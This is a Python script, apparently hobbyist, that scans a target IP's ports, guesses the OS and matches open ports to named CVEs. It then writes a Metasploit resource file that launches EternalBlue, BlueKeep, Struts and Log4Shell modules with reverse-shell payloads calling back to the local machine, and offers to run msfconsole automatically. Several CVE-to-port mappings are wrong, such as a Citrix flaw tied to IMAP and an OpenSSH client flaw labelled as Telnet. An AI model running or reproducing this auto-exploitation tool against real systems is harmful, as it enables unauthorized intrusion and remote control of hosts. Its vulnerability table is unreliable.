# UltraRecon — Escáner de puertos y vulnerabilidades con integración a Metasploit
import socket
import subprocess
import threading
from datetime import datetime
import platform
import os
import time

def banner():
    print("""
    =====================================
                  ULTRARECON
    =====================================
    """)

def obtener_ip_local():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_local = s.getsockname()[0]
    except Exception:
        ip_local = "127.0.0.1"
    finally:
        s.close()
    return ip_local

def escanear_puerto(ip, puerto, resultados):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        resultado = sock.connect_ex((ip, puerto))
        if resultado == 0:
            print(f"    \033[92m[*] Puerto {puerto} abierto\033[0m")
            resultados.append(puerto)
        sock.close()
    except:
        pass

def escanear_puertos(ip, puertos):
    print(f"[+] Escaneando {ip} en los puertos {puertos[0]}-{puertos[-1]}...")
    resultados = []
    hilos = []
    for puerto in puertos:
        hilo = threading.Thread(target=escanear_puerto, args=(ip, puerto, resultados))
        hilos.append(hilo)
        hilo.start()
    for hilo in hilos:
        hilo.join()
    return resultados

def detectar_sistema(ip):
    print("[+] Detectando sistema operativo...")
    try:
        param = "-n 1" if platform.system().lower() == "windows" else "-c 1"
        resultado = subprocess.check_output(["ping", param, ip], universal_newlines=True)
        if "ttl=64" in resultado.lower():
            print("    \033[94m-> Posible Linux\033[0m")
        elif "ttl=128" in resultado.lower():
            print("    \033[94m-> Posible Windows\033[0m")
        elif "ttl=255" in resultado.lower():
            print("    \033[94m-> Posible Cisco/Unix\033[0m")
        else:
            print("    -> No identificado")
    except:
        print("    -> No se pudo detectar el sistema")

def escanear_vulnerabilidades(ip, puertos_abiertos):
    print("[+] Buscando vulnerabilidades comunes...")
    vulnerabilidades = {
        21: ("CVE-2015-3306 (ProFTPD ModCopy Arbitrary File Read/Write)", False, "linux/x86/meterpreter/reverse_tcp"),
        22: ("CVE-2020-14145 (Debilidad en autenticación OpenSSH)", True, "linux/x86/shell_reverse_tcp"),
        23: ("CVE-2016-0777 (Filtración de claves privadas en Telnet)", False, "linux/x86/shell_reverse_tcp"),
        25: ("CVE-2023-51764 (SMTP Command Injection en Exim)", True, "linux/x86/meterpreter/reverse_tcp"),
        53: ("CVE-2020-1350 (Windows DNS Server RCE - SIGRed)", True, "windows/meterpreter/reverse_tcp"),
        80: ("CVE-2017-5638 (Apache Struts RCE)", True, "windows/meterpreter/reverse_tcp"),
        110: ("CVE-2003-1581 (POP3 Buffer Overflow en DMail)", False, "windows/shell/reverse_tcp"),
        139: ("CVE-1999-0205 (Windows NetBIOS NULL Session)", False, "windows/shell/reverse_tcp"),
        143: ("CVE-2019-19781 (Citrix Gateway IMAP exploit)", True, "linux/x64/shell_reverse_tcp"),
        443: ("CVE-2021-44228 (Log4Shell en Apache Log4j)", True, "java/jndi_lookup"),
        445: ("CVE-2020-0796 (SMBGhost - ejecución remota de código)", True, "windows/meterpreter/reverse_tcp"),
        3306: ("CVE-2012-2122 (Autenticación rota en MySQL)", False, "linux/x86/shell_reverse_tcp"),
        3389: ("CVE-2019-0708 (BlueKeep - ejecución remota en RDP)", True, "windows/meterpreter/reverse_tcp")
    }
    resultados = []
    for puerto in puertos_abiertos:
        if puerto in vulnerabilidades:
            nombre_vuln, peligrosa, payload = vulnerabilidades[puerto]
            color = "\033[91m" if peligrosa else "\033[93m"
            print(f"    {color}[!] {nombre_vuln} en el puerto {puerto}\033[0m")
            print(f"        Payload sugerido: {payload}")
            resultados.append((puerto, nombre_vuln, peligrosa, payload))
    return resultados

def generar_script_msf(ip, vulnerabilidades, lhost):
    rutas = {
        445: "exploit/windows/smb/ms17_010_eternalblue",
        3389: "exploit/windows/rdp/cve_2019_0708_bluekeep",
        80: "exploit/multi/http/struts2_content_type_ognl",
        443: "exploit/multi/http/log4shell_header_injection"
    }
    with open("autopwn.rc", "w") as f:
        pass

    script_generado = False
    with open("autopwn.rc", "a") as f:
        for puerto, nombre_vuln, peligrosa, payload in vulnerabilidades:
            if peligrosa and puerto in rutas:
                exploit = rutas[puerto]
                f.write(f"use {exploit}\n")
                f.write(f"set RHOSTS {ip}\n")
                f.write(f"set PAYLOAD {payload}\n")
                f.write(f"set LHOST {lhost}\n")
                f.write("run\n\n")
                script_generado = True
    return script_generado

def main():
    banner()
    ip = input("Ingrese la IP a escanear: ")

    puertos = list(range(1, 4024))  # aquí puedes cambiar la cantidad de puertos que escanear
    inicio = datetime.now()

    puertos_abiertos = escanear_puertos(ip, puertos)
    detectar_sistema(ip)
    vulnerabilidades = escanear_vulnerabilidades(ip, puertos_abiertos)

    script_generado = False
    if vulnerabilidades:
        lhost = obtener_ip_local()
        script_generado = generar_script_msf(ip, vulnerabilidades, lhost)

    tiempo_total = datetime.now() - inicio
    print(f"\n[+] Escaneo completado en {tiempo_total}")

    if script_generado:
        respuesta = input("\n¿Deseas lanzar Metasploit con esta IP? (s/n): ").strip().lower()
        if respuesta == "s":
            print("[+] Esperando 3 segundos antes de lanzar Metasploit...")
            time.sleep(3)
            subprocess.call(["msfconsole", "-r", "autopwn.rc"])
            os.remove("autopwn.rc")
        else:
            print("[-] Ejecución de Metasploit cancelada por el usuario.")
            os.remove("autopwn.rc")
    else:
        print("[-] No se generó ningún script para Metasploit.")
        if os.path.exists("autopwn.rc"):
            os.remove("autopwn.rc")

if __name__ == "__main__":
    main()

# Hecho Por Johnknife
